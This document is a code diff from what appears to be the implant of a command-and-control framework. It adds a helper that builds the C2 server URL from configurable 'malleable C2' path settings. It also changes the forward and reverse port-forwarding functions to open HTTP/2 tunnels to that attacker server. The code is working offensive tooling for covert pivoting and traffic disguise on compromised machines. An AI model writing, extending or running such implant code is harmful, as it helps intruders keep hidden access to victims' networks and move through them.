@@ -93,20 +93,34 @@ func Socks5Proxy(op string, addr string) (err error) {
 
 // PortFwd port mapping, receive request data then send it to target port on remote address
 // addr: when reversed, addr should be port
+func BuildPortFwdURL(sessionID string) (string, error) {
+	prefix := common.RuntimeConfig.C2Prefix
+	proxyPath := common.RuntimeConfig.ProxyPath
+	if prefix == "" || proxyPath == "" {
+		return "", fmt.Errorf("missing malleable C2 config: C2Prefix=%q ProxyPath=%q", prefix, proxyPath)
+	}
+	if def.CCAddress == "" {
+		return "", errors.New("missing CCAddress")
+	}
+	return fmt.Sprintf("%s/%s/%s/%s", def.CCAddress, prefix, proxyPath, sessionID), nil
+}
+
 func PortFwd(addr, sessionID, protocol string, reverse bool, timeout int) (err error) {
 	var (
 		session PortFwdSession
-
-		url = fmt.Sprintf("%s/%s/%s",
-			def.CCAddress,
-			transport.PortMappingAPI,
-			sessionID)
+		url     string
 
 		// connection
 		conn   *h2conn.Conn
 		ctx    context.Context
 		cancel context.CancelFunc
 	)
+
+	url, err = BuildPortFwdURL(sessionID)
+	if err != nil {
+		return err
+	}
+
 	if !netutil.ValidateIPPort(addr) && !reverse {
 		return fmt.Errorf("invalid address: %s", addr)
 	}
@@ -162,10 +176,11 @@ func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 		// tell CC this is a reversed port mapping
 		lport := strings.Split(conn.RemoteAddr().String(), ":")[1]
 		shID := fmt.Sprintf("%s_%s-reverse", sessionID, lport)
-		url := fmt.Sprintf("%s/%s/%s",
-			def.CCAddress,
-			transport.PortMappingAPI,
-			shID)
+		url, urlErr := BuildPortFwdURL(shID)
+		if urlErr != nil {
+			logging.Printf("BuildPortFwdURL (%s) failed: %v", shID, urlErr)
+			return
+		}
 
 		// start a h2 connection per incoming TCP connection
 		h2, _, h2cancel, err := c2transport.EstablishC2Connection(url)
